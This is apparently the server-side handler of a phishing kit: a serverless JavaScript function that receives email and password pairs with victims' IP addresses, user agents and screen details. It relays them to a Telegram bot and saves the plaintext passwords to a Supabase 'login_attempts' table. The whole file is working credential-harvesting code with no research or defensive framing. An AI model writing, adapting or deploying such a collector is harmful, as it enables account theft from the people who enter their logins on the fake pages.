exports.handler = async function(event) {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS'
  };

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' })
    };
  }

  try {
    const payload = JSON.parse(event.body);
    const {
      email,
      password,
      ip,
      userAgent,
      sourceUrl,
      screenInfo,
      timestamp,
      telegramMessage
    } = payload;

    if (!email || !password) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: 'Email and password required' })
      };
    }

    const supabaseUrl = process.env.VITE_SUPABASE_URL;
    const supabaseKey = process.env.VITE_SUPABASE_SERVICE_ROLE_KEY || process.env.VITE_SUPABASE_ANON_KEY;
    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.CHAT_ID;

    if (!supabaseUrl || !supabaseKey) {
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({
          error: 'Supabase not configured',
          debug: {
            hasUrl: !!supabaseUrl,
            hasKey: !!supabaseKey,
            env: Object.keys(process.env).filter(k => k.includes('SUPABASE'))
          }
        })
      };
    }

    let telegramSent = false;
    let telegramSentAt = null;

    if (botToken && chatId && telegramMessage) {
      try {
        const telegramResponse = await fetch(
          `https://api.telegram.org/bot${botToken}/sendMessage`,
          {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: chatId,
              text: telegramMessage,
              parse_mode: 'HTML',
              disable_web_page_preview: true
            })
          }
        );

        if (telegramResponse.ok) {
          telegramSent = true;
          telegramSentAt = new Date().toISOString();
        }
      } catch (telegramError) {
        console.error('Telegram send failed:', telegramError);
      }
    }

    const dbPayload = {
      email: email.trim(),
      password: password,
      ip_address: ip || event.headers['x-forwarded-for'] || event.headers['client-ip'] || 'unknown',
      user_agent: userAgent || event.headers['user-agent'] || 'unknown',
      source_url: sourceUrl || 'unknown',
      screen_info: screenInfo || '{}',
      timestamp: timestamp || new Date().toISOString(),
      telegram_sent: telegramSent,
      telegram_sent_at: telegramSentAt,
      verified: false
    };

    const response = await fetch(`${supabaseUrl}/rest/v1/login_attempts`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'apikey': supabaseKey,
        'Authorization': `Bearer ${supabaseKey}`,
        'Prefer': 'return=representation'
      },
      body: JSON.stringify(dbPayload)
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error('Supabase API error:', response.status, errorText);
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({
          error: 'Failed to store login attempt',
          details: errorText,
          status: response.status
        })
      };
    }

    const data = await response.json();
    const insertedRecord = Array.isArray(data) ? data[0] : data;

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        telegramSent: telegramSent,
        stored: true,
        id: insertedRecord?.id
      })
    };
  } catch (error) {
    console.error('Error:', error);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        error: 'Internal server error',
        details: error.message,
        stack: error.stack
      })
    };
  }
};
